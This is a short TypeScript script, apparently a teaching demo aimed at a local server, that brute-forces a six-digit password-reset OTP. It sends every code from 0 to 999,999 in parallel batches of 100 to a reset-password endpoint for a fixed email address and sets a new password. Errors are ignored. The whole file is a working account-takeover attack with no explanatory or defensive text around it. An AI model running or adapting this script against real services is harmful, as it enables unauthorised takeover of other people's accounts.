import axios from "axios";

async function sendRequest(otp: number) {
      let data = JSON.stringify({
        "email": "rohith@gmail.com",
        "newPassword": "newpassword",
        "otp": otp
      });

      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'localhost:3000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };
        try{
          await axios.request(config)
        }catch(e){
          
        }
}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()
